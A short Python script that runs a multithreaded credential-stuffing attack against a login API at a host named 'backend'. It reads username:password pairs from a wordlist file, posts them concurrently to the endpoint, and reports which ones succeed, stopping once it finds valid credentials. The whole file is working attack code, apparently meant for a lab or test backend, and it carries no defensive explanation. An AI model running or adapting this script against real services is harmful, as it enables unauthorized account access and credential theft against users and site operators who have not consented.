import requests
from concurrent.futures import ThreadPoolExecutor

LOGIN_URL = "http://backend:8080/api/auth/login"
WORDLIST_FILE = "wordlist.txt"
THREADS = 10

session = requests.Session()

def load_credentials(filename):
    credentials = []
    with open(filename, "r") as file:
        for line in file:
            parts = line.strip().split(":")
            if len(parts) == 2:
                credentials.append((parts[0], parts[1]))
    return credentials

def attempt_login(username, password):

    data = {
        "email": username,
        "password": password
    }
    try:
        response = session.post(LOGIN_URL, json=data, timeout=5)
        if response.status_code == 200:
            print(f"SUCCESS: {username}:{password}")
            return True
        else:
            print(f"FAILED: {username}:{password} (Status {response.status_code})")
            return False
    except requests.exceptions.RequestException as e:
        print(f"ERROR: {e}")
        return False

def worker(credentials):
    for username, password in credentials:
        if attempt_login(username, password):
            print("Stopping attack - valid credentials found!")
            return

def main():
    credentials = load_credentials(WORDLIST_FILE)


    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        chunk_size = len(credentials) // THREADS
        chunks = [credentials[i:i + chunk_size] for i in range(0, len(credentials), chunk_size)]

        executor.map(worker, chunks)

if __name__ == "__main__":
    main()
